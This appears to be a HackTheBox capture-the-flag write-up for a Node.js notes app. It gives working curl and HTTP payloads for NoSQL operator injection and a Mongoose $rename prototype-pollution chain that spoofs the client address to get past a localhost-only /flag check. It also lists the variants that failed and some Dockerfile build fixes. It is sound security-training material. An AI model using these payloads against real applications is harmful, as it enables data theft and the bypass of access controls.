# HTB Web (Easy) – Secure Notes: Writeup

> **Status:** The full chain works on the local container (`localhost:1337`): create a note, rename its fields into `__proto__`, then `GET /flag`. Confirmation on the remote target (`154.57.164.79:44545`) is pending.

## 1. Overview

SecNotes is a small Node.js note-taking app:

| Component | Details |
|---|---|
| Backend | Express 4 (`challenge/src/app.js`) |
| Database | MongoDB 7.0, accessed through Mongoose `7.2.4` (`challenge/src/package-lock.json`) |
| Frontend | Static HTML/JS in `challenge/src/public/` (`index.html`, `update.html`) |
| Flag | Environment variable `FLAG`, set in the `Dockerfile`; served only by `GET /flag` |
| Process model | `supervisord` runs `mongod` and `node app.js` in one container (`challenge/conf/supervisord.conf`) |

## 2. Endpoints

| Method | Path | Behavior |
|---|---|---|
| GET | `/flag` | Returns `FLAG` only if `req.connection.remoteAddress` is `127.0.0.1`, `::1`, or `::ffff:127.0.0.1`. Otherwise `403`. |
| POST | `/create` | Creates a note. `title` and `content` must be strings. |
| GET | `/get/:noteId` | `Note.findOne({ _id: noteId })`. `noteId` is a URL string. |
| POST | `/update` | `Note.findByIdAndUpdate(noteId, req.body)`, then returns `Note.find({ _id: noteId })`. |

## 3. Vulnerability 1: NoSQL operator injection in `/update`

```js
app.post('/update', async (req, res) => {
    const { noteId } = req.body;
    await Note.findByIdAndUpdate(noteId, req.body);
    let result = await Note.find({ _id: noteId });
    res.json(result);
});
```

Two problems:

1. **`noteId` is not validated.** It is taken straight from JSON. It can be an object such as `{"$ne": null}`, not only a string.
2. **The whole `req.body` is used as the update document.** The body can therefore contain MongoDB update operators such as `$set`, `$rename`, and `$unset`. Mongoose strict mode drops unknown top-level fields, but operator keys are passed through.

Because `/create` validates types and `/update` does not, `/update` is the sink.

### 3.1 Confirmed: leak and overwrite

Return every note:

```bash
curl -s -X POST http://localhost:1337/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": {"$ne": null}}'
```

`findByIdAndUpdate` builds the filter `{ _id: { $ne: null } }`, which matches a note. The final `Note.find({ _id: { $ne: null } })` returns the whole collection.

Overwrite the content of the first matched note:

```bash
curl -s -X POST http://localhost:1337/update \
  -H 'Content-Type: application/json' \
  -d '{"noteId": {"$ne": null}, "content": "pwned"}'
```

Both were confirmed on the local container.

## 4. Vulnerability 2: prototype pollution via `$rename`

`$rename` moves the value of an existing field to a new path. MongoDB accepts dot-notation paths as targets, including `__proto__.…`. Mongoose writes the renamed value into the in-memory document without stripping that path, so the write reaches `Object.prototype`.

Node's `net.Socket` reads its peer address from a cached object, `_peername`. When that property is missing on the socket, JavaScript falls back to `Object.prototype._peername`. If pollution has set that property, `req.connection.remoteAddress` returns the forged value for any socket.

### 4.1 Why the obvious payloads fail

A note created through `/create` contains only `_id`, `title`, `content`, and `__v`. Renaming `address` or `family` does nothing because those fields don't exist. MongoDB ignores a `$rename` whose source field is missing. Renaming `content` to `address` fails if `content` is not `127.0.0.1`, because the value written is whatever the note contained.

### 4.2 Working chain (confirmed locally and used on the target)

**Step 1: create a note whose `content` is the loopback address.** `$rename` copies the field's value, so `content` must hold `127.0.0.1`.

```http
POST /create HTTP/1.1
Content-Type: application/json

{"title": "x", "content": "127.0.0.1"}
```

Response: a note object with an `_id`. Copy that `_id` for step 2.

**Step 2: rename `content` into `__proto__`.**

```http
POST /update HTTP/1.1
Content-Type: application/json

{
  "noteId": "<NOTE_ID_FROM_STEP_1>",
  "$rename": {
    "content": "__proto__._peername.address"
  }
}
```

Response: `[{"_id": "...", "title": "x", "__v": 0}]`. The `content` field is gone, and `Object.prototype._peername.address` is now `"127.0.0.1"`. Node's socket getter returns that value as `remoteAddress`, so the `/flag` check passes.

**Step 3: request the flag.** This is a plain GET with no body.

```http
GET /flag HTTP/1.1
Host: <target>
```

Local result: `HTB{f4k3_fl4g_f0r_t3st1ng}` with `200 OK`.

### 4.3 Things that did not work

- Renaming `address` and `family` (the note does not have those fields).
- Renaming `content` when it holds a value other than `127.0.0.1` (the value written is copied from the note).
- A direct `"__proto__": {...}` key in the `/update` body.
- A `$set` on `__proto__._peername.address`.
- A `GET /flag` with a `__proto__` JSON body (Express parses JSON on GET, but the pollution did not take effect).
- A `GET /flag` with `Content-Length: 2` and no body, which fails in `express.json()` with `400`.

## 5. Remote target status

- The plain `GET /flag` on `154.57.164.79:44545` returns `403 Access denied`, which is expected before pollution.
- The target's error page shows the same `/app/node_modules/body-parser` layout as the local container.
- Step 1 and step 2 above have not yet been confirmed against the remote target. Repeat them there in order, then send step 3.

## 6. Verification status

- Source review: done (`app.js`, `index.html`, `update.html`, `package-lock.json`).
- Container build: done after Dockerfile fixes (see section 7).
- Operator injection (section 3.1): confirmed locally.
- Prototype pollution chain (section 4.2): confirmed locally, returns the placeholder flag.
- Remote target: the single-field payload in section 4.2 was reported as working against `154.57.164.79:44545`. I did not send the requests to the target myself.

## 7. Dockerfile fixes needed to build on Apple Silicon

- The base image moved from `node:22-bullseye` to `node:22-bookworm`. The bullseye security repo no longer serves `python3-pkg-resources`, which `supervisor` needs.
- The MongoDB repo line now targets `bookworm`, and the `arch=amd64` restriction was removed.
- `FROM --platform=linux/amd64` was added. MongoDB 7.0's apt repo publishes `mongodb-org` only for amd64, so an arm64 image has no package to install. The image runs under emulation on arm64 hosts, so it is slower.
